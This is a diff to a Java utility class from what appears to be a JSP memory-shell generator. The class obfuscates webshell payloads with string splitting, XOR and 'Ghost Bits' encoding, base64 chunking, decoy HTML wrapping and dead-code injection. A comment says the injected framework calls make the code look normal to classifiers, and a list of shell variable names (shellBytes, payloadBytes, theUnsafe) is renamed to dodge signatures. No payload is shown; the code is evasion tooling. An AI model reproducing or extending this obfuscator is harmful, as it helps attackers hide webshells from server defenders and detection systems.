@@ -1,6 +1,8 @@
 package org.leo.jmg.mem.packer;
 
 import org.leo.core.util.request.ClassNameGenerator;
+import org.leo.core.util.request.GenerationRandom;
+import org.leo.jmg.mem.packer.jsp.JspDocument;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -8,8 +10,8 @@ import java.io.InputStream;
 import java.nio.charset.Charset;
 import java.util.HashSet;
 import java.util.Objects;
+import java.util.Random;
 import java.util.Set;
-import java.util.concurrent.ThreadLocalRandom;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -85,7 +87,7 @@ public class Util {
      * @return 字面量已随机分割的代码
      */
     public static String splitStringLiterals(String code) {
-        ThreadLocalRandom random = ThreadLocalRandom.current();
+        Random random = GenerationRandom.current();
         for (String literal : collectLiterals(code)) {
             String target = "\"" + literal + "\"";
             if (!code.contains(target) || literal.length() < 2) continue;
@@ -147,7 +149,7 @@ public class Util {
     };
 
     private static String randomNoiseTag() {
-        ThreadLocalRandom random = ThreadLocalRandom.current();
+        Random random = GenerationRandom.current();
         int choice = random.nextInt(6);
         switch (choice) {
             case 0: {
@@ -194,7 +196,7 @@ public class Util {
     }
 
     /** 生成随机小写单词，长度在 [minLen, maxLen) */
-    private static String randomWord(ThreadLocalRandom random, int minLen, int maxLen) {
+    private static String randomWord(Random random, int minLen, int maxLen) {
         int len = minLen + random.nextInt(maxLen - minLen);
         char[] chars = new char[len];
         for (int i = 0; i < len; i++) {
@@ -246,7 +248,7 @@ public class Util {
      * @return Ghost Bits 编码后的代码
      */
     public static String ghostBitsEncode(String code) {
-        ThreadLocalRandom random = ThreadLocalRandom.current();
+        Random random = GenerationRandom.current();
 
         // 1. 生成本次 helper 方法名（随机，消除固定特征）
         String methodName = ClassNameGenerator.randomFieldName(new HashSet<String>());
@@ -298,36 +300,13 @@ public class Util {
      * @return 注入 helper 后的代码
      */
     private static String injectHelperDecl(String code, String helperDecl, boolean needUtf8) {
-        if (code.contains("<jsp:declaration>")) {
-            int declStart = code.indexOf("<jsp:declaration>");
-            int cdataEnd  = code.indexOf("]]>", declStart);
-            if (cdataEnd >= 0) {
-                code = code.substring(0, cdataEnd)
-                        + "\n        " + helperDecl + "\n        "
-                        + code.substring(cdataEnd);
-            }
-        } else {
-            if (needUtf8 && !code.contains("pageEncoding")) {
-                code = "<%@ page pageEncoding=\"UTF-8\" %>\n" + code;
-            }
-            int declIdx = code.indexOf("<%!");
-            if (declIdx >= 0) {
-                int closeIdx = code.indexOf("%>", declIdx + 3);
-                if (closeIdx >= 0) {
-                    code = code.substring(0, closeIdx)
-                            + "\n    " + helperDecl + "\n"
-                            + code.substring(closeIdx);
-                }
-            } else {
-                int scriptletIdx = code.indexOf("<%");
-                if (scriptletIdx >= 0) {
-                    code = code.substring(0, scriptletIdx)
-                            + "<%!\n    " + helperDecl + "\n%>\n"
-                            + code.substring(scriptletIdx);
-                }
-            }
+        boolean jspx = code.contains("<jsp:root")
+                || code.contains("<jsp:scriptlet")
+                || code.contains("<jsp:declaration");
+        if (needUtf8 && !jspx && !code.contains("pageEncoding")) {
+            code = "<%@ page pageEncoding=\"UTF-8\" %>\n" + code;
         }
-        return code;
+        return JspDocument.parse(code).appendDeclaration(helperDecl).render();
     }
 
     // -----------------------------------------------------------------------
@@ -358,7 +337,7 @@ public class Util {
      * @return 双字符打包编码后的代码
      */
     public static String packTwoToOne(String code) {
-        ThreadLocalRandom random = ThreadLocalRandom.current();
+        Random random = GenerationRandom.current();
         String methodName = ClassNameGenerator.randomFieldName(new HashSet<String>());
         boolean changed = false;
 
@@ -448,7 +427,7 @@ public class Util {
      * @return 包裹后的代码
      */
     public static String wrapWithHtmlJs(String jspCode) {
-        ThreadLocalRandom random = ThreadLocalRandom.current();
+        Random random = GenerationRandom.current();
         String title = HTML_TITLES[random.nextInt(HTML_TITLES.length)];
         // 随机拼 1-2 个 meta 标签
         int metaCount = 1 + random.nextInt(2);
@@ -498,7 +477,7 @@ public class Util {
         // 先检查是否有可处理的 payload，没有则直接返回
         if (!m.find()) return code;
 
-        ThreadLocalRandom random = ThreadLocalRandom.current();
+        Random random = GenerationRandom.current();
         int key = 1 + random.nextInt(126); // XOR 密钥：1-126
         Set<String> helperNames = new HashSet<String>();
         String methodName = ClassNameGenerator.randomFieldName(helperNames);
@@ -587,7 +566,7 @@ public class Util {
         Pattern p = Pattern.compile("\"([A-Za-z0-9+/=]{100,})\"");
         Matcher m = p.matcher(code);
         StringBuffer sb = new StringBuffer();
-        ThreadLocalRandom random = ThreadLocalRandom.current();
+        Random random = GenerationRandom.current();
         while (m.find()) {
             String payload = m.group(1);
             m.appendReplacement(sb, Matcher.quoteReplacement(chunkString(payload, random)));
@@ -596,7 +575,7 @@ public class Util {
         return sb.toString();
     }
 
-    private static String chunkString(String s, ThreadLocalRandom random) {
+    private static String chunkString(String s, Random random) {
         StringBuilder sb = new StringBuilder();
         int i = 0;
         while (i < s.length()) {
@@ -627,56 +606,33 @@ public class Util {
      * @return 注入噪声后的代码
      */
     public static String injectScriptletNoise(String code) {
-        ThreadLocalRandom random = ThreadLocalRandom.current();
-        Set<String> used = new HashSet<String>();
-
-        if (code.contains("<jsp:scriptlet>")) {
-            // JSPX 模式：仅在 <jsp:scriptlet> 标签内的 CDATA 块注入，跳过 <jsp:declaration> 的 CDATA
-            Pattern p = Pattern.compile(
-                "<jsp:scriptlet>(\\s*<!\\[CDATA\\[)",
-                Pattern.DOTALL
-            );
-            Matcher m = p.matcher(code);
-            StringBuffer sb = new StringBuffer();
-            while (m.find()) {
-                String prefix = m.group(1); // 保留 <jsp:scriptlet> 与 <![CDATA[ 之间的空白
-                String noise = buildScriptletNoise(random, used);
-                m.appendReplacement(sb, Matcher.quoteReplacement(
-                    "<jsp:scriptlet>" + prefix + noise));
+        final Random random = GenerationRandom.current();
+        final Set<String> used = new HashSet<String>();
+        return JspDocument.parse(code).transformScriptlets(new JspDocument.ContentTransformer() {
+            @Override
+            public String transform(String content) {
+                return buildScriptletNoise(random, used) + content;
             }
-            m.appendTail(sb);
-            return sb.toString();
-        } else {
-            // JSP 模式：在 <% 块（排除 <%! <%@ <%=）开头注入
-            Pattern p = Pattern.compile("<%(?![!@=])");
-            Matcher m = p.matcher(code);
-            StringBuffer sb = new StringBuffer();
-            while (m.find()) {
-                String noise = buildScriptletNoise(random, used);
-                m.appendReplacement(sb, Matcher.quoteReplacement("<%" + noise));
-            }
-            m.appendTail(sb);
-            return sb.toString();
-        }
+        }).render();
     }
 
-    /** 生成 1-2 条随机无副作用 Java 声明语句（含换行缩进） */
-    private static String buildScriptletNoise(ThreadLocalRandom random, Set<String> used) {
+    /** 生成 1-2 条仅包含常量表达式的 Java 声明，避免读取系统状态或触发类加载。 */
+    private static String buildScriptletNoise(Random random, Set<String> used) {
         int count = 1 + random.nextInt(2);
         StringBuilder sb = new StringBuilder();
         for (int i = 0; i < count; i++) {
             String v = ClassNameGenerator.randomFieldName(used);
             switch (random.nextInt(5)) {
                 case 0: sb.append("\n    int ").append(v)
-                          .append(" = Runtime.getRuntime().availableProcessors();"); break;
+                          .append(" = ").append(random.nextInt(1024)).append(";"); break;
                 case 1: sb.append("\n    long ").append(v)
-                          .append(" = System.currentTimeMillis();"); break;
+                          .append(" = ").append(random.nextInt(65536)).append("L;"); break;
                 case 2: sb.append("\n    boolean ").append(v)
-                          .append(" = Thread.currentThread().isDaemon();"); break;
+                          .append(random.nextBoolean() ? " = true;" : " = false;"); break;
                 case 3: sb.append("\n    String ").append(v)
-                          .append(" = System.getProperty(\"java.version\", \"\");"); break;
+                          .append(" = \"").append(randomWord(random, 3, 9)).append("\";"); break;
                 default: sb.append("\n    Object ").append(v)
-                           .append(" = Thread.currentThread().getContextClassLoader().getParent();"); break;
+                           .append(" = null;"); break;
             }
         }
         sb.append('\n');
@@ -714,37 +670,14 @@ public class Util {
      * @return 注入死代码块后的代码
      */
     public static String injectDeadBlocks(String code) {
-        ThreadLocalRandom random = ThreadLocalRandom.current();
-        Set<String> used = new HashSet<String>();
-
-        if (code.contains("<jsp:scriptlet>")) {
-            // JSPX 模式：仅在 <jsp:scriptlet> 内的 CDATA 块注入
-            Pattern p = Pattern.compile(
-                "<jsp:scriptlet>(\\s*<!\\[CDATA\\[)",
-                Pattern.DOTALL
-            );
-            Matcher m = p.matcher(code);
-            StringBuffer sb = new StringBuffer();
-            while (m.find()) {
-                String prefix = m.group(1);
-                String block = buildDeadBlock(random, used);
-                m.appendReplacement(sb, Matcher.quoteReplacement(
-                    "<jsp:scriptlet>" + prefix + block));
+        final Random random = GenerationRandom.current();
+        final Set<String> used = new HashSet<String>();
+        return JspDocument.parse(code).transformScriptlets(new JspDocument.ContentTransformer() {
+            @Override
+            public String transform(String content) {
+                return buildDeadBlock(random, used) + content;
             }
-            m.appendTail(sb);
-            return sb.toString();
-        } else {
-            // JSP 模式：在 <% 块（排除 <%! <%@ <%=）开头注入
-            Pattern p = Pattern.compile("<%(?![!@=])");
-            Matcher m = p.matcher(code);
-            StringBuffer sb = new StringBuffer();
-            while (m.find()) {
-                String block = buildDeadBlock(random, used);
-                m.appendReplacement(sb, Matcher.quoteReplacement("<%" + block));
-            }
-            m.appendTail(sb);
-            return sb.toString();
-        }
+        }).render();
     }
 
     /** 常见框架类名，注入到 try-catch 中，让分类器看到正常框架调用 */
@@ -761,17 +694,19 @@ public class Util {
     };
 
     /** 生成 1 条随机死代码块（含换行缩进） */
-    private static String buildDeadBlock(ThreadLocalRandom random, Set<String> used) {
+    private static String buildDeadBlock(Random random, Set<String> used) {
         String v = ClassNameGenerator.randomFieldName(used);
         switch (random.nextInt(5)) {
             case 0: {
                 // try { Class.forName("框架类"); } catch (ClassNotFoundException v) {}
                 String cls = DEAD_CLASS_NAMES[random.nextInt(DEAD_CLASS_NAMES.length)];
-                return "\n    try{Class.forName(\"" + cls + "\");}catch(ClassNotFoundException " + v + "){}";
+                return "\n    if(false){try{Class.forName(\"" + cls
+                        + "\");}catch(ClassNotFoundException " + v + "){}}";
             }
             case 1: {
                 // try { new InitialContext().lookup("java:comp/env"); } catch (Exception v) {}
-                return "\n    try{new javax.naming.InitialContext().lookup(\"java:comp/env\");}catch(Exception " + v + "){}";
+                return "\n    if(false){try{new javax.naming.InitialContext().lookup(\"java:comp/env\");}"
+                        + "catch(Exception " + v + "){}}";
             }
             case 2: {
                 // if (false) { String v = System.getProperty("server.name", ""); }
@@ -920,13 +855,8 @@ public class Util {
     private static final String[] KNOWN_SHELL_VARS = {
         "shellBytes", "classBytes", "payloadBytes", "byteCode",
         "classLoader", "parentLoader", "targetLoader",
-        "defineClass", "loadClass",
         "theUnsafe", "unsafe",
-        "clazz", "cls",
-        "constructor",
-        "runtime", "process",
-        "method", "field",
-        "loader"
+        "clazz", "cls"
     };
 
     /**
@@ -957,61 +887,93 @@ public class Util {
         if (mapping.isEmpty()) return code;
 
         // 按长度降序迭代，避免短名污染长名的替换（KNOWN_SHELL_VARS 已预排序，此处重排保险）
-        java.util.List<java.util.Map.Entry<String, String>> entries =
-                new java.util.ArrayList<java.util.Map.Entry<String, String>>(mapping.entrySet());
-        entries.sort(new java.util.Comparator<java.util.Map.Entry<String, String>>() {
-            public int compare(java.util.Map.Entry<String, String> a,
-                               java.util.Map.Entry<String, String> b) {
-                return b.getKey().length() - a.getKey().length();
+        final java.util.Map<String, String> finalMapping = mapping;
+        return JspDocument.parse(code).transformJavaSegments(new JspDocument.ContentTransformer() {
+            @Override
+            public String transform(String content) {
+                return applyIdentifierMapping(content, finalMapping);
             }
-        });
-
-        // 2. 根据格式选择替换策略
-        if (code.contains("<jsp:scriptlet>") || code.contains("<jsp:declaration>")) {
-            // JSPX：仅替换所有 <![CDATA[...]]> 块内内容
-            Pattern cdataPattern = Pattern.compile("(<!\\[CDATA\\[)(.*?)(\\]\\]>)", Pattern.DOTALL);
-            Matcher m = cdataPattern.matcher(code);
-            StringBuffer sb = new StringBuffer();
-            while (m.find()) {
-                String cdata = applyMapping(m.group(2), entries);
-                m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + cdata + m.group(3)));
-            }
-            m.appendTail(sb);
-            return sb.toString();
-        } else {
-            // JSP：分两轮分别处理 <% %> 和 <%! %> 块
-            // 第一轮：执行 scriptlet 块 <% %>（排除 <%! <%@ <%=）
-            Pattern scriptletPat = Pattern.compile("(<%(?![!@=]))(.*?)(%>)", Pattern.DOTALL);
-            Matcher m = scriptletPat.matcher(code);
-            StringBuffer sb = new StringBuffer();
-            while (m.find()) {
-                String content = applyMapping(m.group(2), entries);
-                m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + content + m.group(3)));
-            }
-            m.appendTail(sb);
-            code = sb.toString();
-
-            // 第二轮：声明块 <%! %>
-            Pattern declPat = Pattern.compile("(<%!)(.*?)(%>)", Pattern.DOTALL);
-            m = declPat.matcher(code);
-            sb = new StringBuffer();
-            while (m.find()) {
-                String content = applyMapping(m.group(2), entries);
-                m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + content + m.group(3)));
-            }
-            m.appendTail(sb);
-            return sb.toString();
-        }
+        }).render();
     }
 
-    /** 对 content 依次应用 mapping 中的全词替换，返回替换后的字符串 */
-    private static String applyMapping(String content,
-            java.util.List<java.util.Map.Entry<String, String>> entries) {
-        for (java.util.Map.Entry<String, String> e : entries) {
-            content = content.replaceAll("\\b" + Pattern.quote(e.getKey()) + "\\b",
-                    Matcher.quoteReplacement(e.getValue()));
+    /**
+     * 仅在 Java 普通代码区域替换标识符，字符串、字符、行注释和块注释保持原样。
+     * 后接左括号的标识符视为方法名，不参与重命名。
+     */
+    private static String applyIdentifierMapping(String content,
+            java.util.Map<String, String> mapping) {
+        StringBuilder out = new StringBuilder(content.length());
+        final int normal = 0;
+        final int string = 1;
+        final int character = 2;
+        final int lineComment = 3;
+        final int blockComment = 4;
+        int state = normal;
+
+        for (int i = 0; i < content.length();) {
+            char c = content.charAt(i);
+            char next = i + 1 < content.length() ? content.charAt(i + 1) : '\0';
+
+            if (state == normal) {
+                if (c == '"') {
+                    state = string;
+                    out.append(c);
+                    i++;
+                } else if (c == '\'') {
+                    state = character;
+                    out.append(c);
+                    i++;
+                } else if (c == '/' && next == '/') {
+                    state = lineComment;
+                    out.append(c).append(next);
+                    i += 2;
+                } else if (c == '/' && next == '*') {
+                    state = blockComment;
+                    out.append(c).append(next);
+                    i += 2;
+                } else if (Character.isJavaIdentifierStart(c)) {
+                    int end = i + 1;
+                    while (end < content.length()
+                            && Character.isJavaIdentifierPart(content.charAt(end))) {
+                        end++;
+                    }
+                    String token = content.substring(i, end);
+                    int lookahead = end;
+                    while (lookahead < content.length()
+                            && Character.isWhitespace(content.charAt(lookahead))) {
+                        lookahead++;
+                    }
+                    String replacement = mapping.get(token);
+                    boolean methodLike = lookahead < content.length()
+                            && content.charAt(lookahead) == '(';
+                    out.append(replacement != null && !methodLike ? replacement : token);
+                    i = end;
+                } else {
+                    out.append(c);
+                    i++;
+                }
+                continue;
+            }
+
+            out.append(c);
+            i++;
+            if ((state == string || state == character) && c == '\\' && i < content.length()) {
+                out.append(content.charAt(i));
+                i++;
+            } else if (state == string && c == '"') {
+                state = normal;
+            } else if (state == character && c == '\'') {
+                state = normal;
+            } else if (state == lineComment && (c == '\n' || c == '\r')) {
+                state = normal;
+            } else if (state == blockComment && c == '*' && i < content.length()
+                    && content.charAt(i) == '/') {
+                out.append('/');
+                i++;
+                state = normal;
+            }
         }
-        return content;
+        return out.toString();
     }
 
     /**
@@ -1041,24 +1003,17 @@ public class Util {
      * @return 格式随机化后的代码
      */
     public static String normalizeWhitespace(String code) {
-        ThreadLocalRandom rng = ThreadLocalRandom.current();
+        Random rng = GenerationRandom.current();
         // 每次运行随机选一种缩进单元，让输出格式特征无法固定
         String[] indentOptions = {"  ", "   ", "    ", "\t"};
         String indentUnit = indentOptions[rng.nextInt(indentOptions.length)];
 
-        // 匹配 <%! ... %> 和 <% ... %>，DOTALL 使 . 匹配换行
-        Pattern scriptletPat = Pattern.compile("(<%!?)(.*?)(%>)", Pattern.DOTALL);
-        Matcher m = scriptletPat.matcher(code);
-        StringBuffer sb = new StringBuffer();
-        while (m.find()) {
-            String open    = m.group(1);
-            String content = m.group(2);
-            String close   = m.group(3);
-            String rewritten = reformatScriptletContent(content, indentUnit, rng);
-            m.appendReplacement(sb, Matcher.quoteReplacement(open + rewritten + close));
-        }
-        m.appendTail(sb);
-        return sb.toString();
+        return JspDocument.parse(code).transformJavaSegments(new JspDocument.ContentTransformer() {
+            @Override
+            public String transform(String content) {
+                return reformatScriptletContent(content, indentUnit, rng);
+            }
+        }).render();
     }
 
     /**
@@ -1070,7 +1025,7 @@ public class Util {
      * </ul>
      */
     private static String reformatScriptletContent(String content, String indentUnit,
-                                                    ThreadLocalRandom rng) {
+                                                    Random rng) {
         String[] lines = content.split("\n", -1);
         StringBuilder out = new StringBuilder();
         for (int i = 0; i < lines.length; i++) {
